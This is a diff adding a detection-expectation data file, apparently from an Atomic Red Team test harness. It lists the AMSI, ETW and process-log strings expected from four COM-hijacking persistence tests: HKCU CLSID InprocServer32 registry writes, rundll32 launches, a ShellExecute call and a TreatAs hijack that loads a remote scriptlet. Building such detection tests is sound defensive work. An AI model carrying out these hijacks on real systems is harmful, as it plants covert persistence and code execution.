@@ -1,0 +1,60 @@
+T1546.015,windows,48117158,COM Hijacking - InprocServer32
+ARG,clsid,{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}
+ARG,clsid_description,MSAA AccPropServices
+ARG,clsid_threading,Apartment
+ARG,dllpath,C:\Users\quantumuser\atomic-harness1\atomic-red-team\atomics\..\ExternalPayloads\AtomicTest.dll
+_E_,AMSI,app_name~=PowerShell
+_E_,AMSI,scan_content~=New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}' -Value '#{clsid_description}'
+_E_,AMSI,scan_content~=New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}\InprocServer32' -Value 
+_E_,AMSI,scan_content~=atomics\..\ExternalPayloads\AtomicTest.dll
+_E_,AMSI,scan_content~=New-ItemProperty -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}\InprocServer32' -Name 'ThreadingModel' -Value '#{clsid_threading}' -PropertyType "String"
+_E_,AMSI,scan_content~=Start-Process -FilePath "C:\Windows\System32\RUNDLL32.EXE" -ArgumentList '-sta #{clsid}'
+_E_,ETW,chan_name~=Microsoft-Windows-PowerShell
+_E_,ETW,event_msg~=Creating Scriptblock text
+_E_,ETW,event_data_list~=New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}' -Value '#{clsid_description}'
+_E_,ETW,event_data_list~=New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}\InprocServer32' -Value
+_E_,ETW,event_data_list~=atomics\..\ExternalPayloads\AtomicTest.dll
+_E_,ETW,event_data_list~=New-ItemProperty -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}\InprocServer32' -Name 'ThreadingModel' -Value '#{clsid_threading}' -PropertyType "String"
+_E_,ETW,event_data_list~=Start-Process -FilePath "C:\Windows\System32\RUNDLL32.EXE" -ArgumentList '-sta #{clsid}'
+
+T1546.015,windows,752191b1,Powershell Execute COM Object
+_E_,AMSI,app_name~=PowerShell
+_E_,AMSI,scan_content~=$o= [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39"))
+_E_,AMSI,scan_content~=$item = $o.Item()
+_E_,AMSI,scan_content~=$item.Document.Application.ShellExecute("cmd.exe","/c calc.exe","C:\windows\system32",$null,0)
+
+T1546.015,windows,123520cc,COM Hijacking with RunDLL32 (Local Server Switch)
+ARG,clsid_threading,Both
+ARG,dll_path,C:\Users\quantumuser\atomic-harness1\atomic-red-team\atomics\..\ExternalPayloads\T1546.015_calc.dll
+ARG,clsid,{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}
+ARG,clsid_description,MSAA AccPropServices
+_E_,AMSI,scan_content~=New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}' -Value '#{clsid_description}'
+_E_,AMSI,scan_content~=New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}\InprocServer32' -Value 
+_E_,AMSI,scan_content~=atomics\..\ExternalPayloads\T1546.015_calc.dll
+_E_,AMSI,scan_content~=New-ItemProperty -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}\InprocServer32' -Name 'ThreadingModel' -Value '#{clsid_threading}' -PropertyType "String"
+_E_,AMSI,scan_content~=Start-Process -FilePath "C:\Windows\System32\RUNDLL32.EXE" -ArgumentList '-localserver #{clsid}'
+_E_,ETW,chan_name~=Microsoft-Windows-PowerShell
+_E_,ETW,event_msg~=Creating Scriptblock text
+_E_,ETW,event_data_list~=New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}' -Value '#{clsid_description}'
+_E_,ETW,event_data_list~=New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}\InprocServer32' -Value
+_E_,ETW,event_data_list~=atomics\..\ExternalPayloads\T1546.015_calc.dll
+_E_,ETW,event_data_list~=New-ItemProperty -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}\InprocServer32' -Name 'ThreadingModel' -Value '#{clsid_threading}' -PropertyType "String"
+_E_,ETW,event_data_list~=Start-Process -FilePath "C:\Windows\System32\RUNDLL32.EXE" -ArgumentList '-localserver #{clsid}'
+
+T1546.015,windows,33eacead,COM hijacking via TreatAs
+_E_,Process,cmdline~=reg.exe add HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest /ve /T REG_SZ /d AtomicTest /f
+_E_,Process,cmdline~=reg.exe add HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest.1.00 /ve /T REG_SZ /d AtomicTest /f
+_E_,Process,cmdline~=reg.exe add HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest\CLSID /ve /T REG_SZ /d {00000001-0000-0000-0000-0000FEEDACDC} /f
+_E_,Process,cmdline~=reg.exe add HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest.1.00\CLSID /ve /T REG_SZ /d {00000001-0000-0000-0000-0000FEEDACDC} /f
+_E_,Process,cmdline~=reg.exe add HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC} /f
+_E_,Process,cmdline~=reg.exe add HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC} /ve /T REG_SZ /d AtomicTest /f
+_E_,Process,cmdline~=reg.exe add HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32 /ve /T REG_SZ /d C:\WINDOWS\system32\scrobj.dll /f
+_E_,Process,cmdline~=reg.exe add HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32 /v ThreadingModel /T REG_SZ /d Apartment /f
+_E_,Process,cmdline~=reg.exe add HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ProgID /ve /T REG_SZ /d AtomicTest /f
+_E_,Process,cmdline~=reg.exe add HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL /ve /T REG_SZ /d https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/src/TreatAs.sct /f
+_E_,Process,cmdline~=reg.exe add HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\VersionIndependentProgID /ve /T REG_SZ /d AtomicTest /f
+_E_,Process,cmdline~=reg.exe add HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E} /f
+_E_,Process,cmdline~=reg.exe add HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs /ve /T REG_SZ /d {00000001-0000-0000-0000-0000FEEDACDC} /f
+_E_,Process,cmdline~=rundll32.exe -sta AtomicTest
+
+
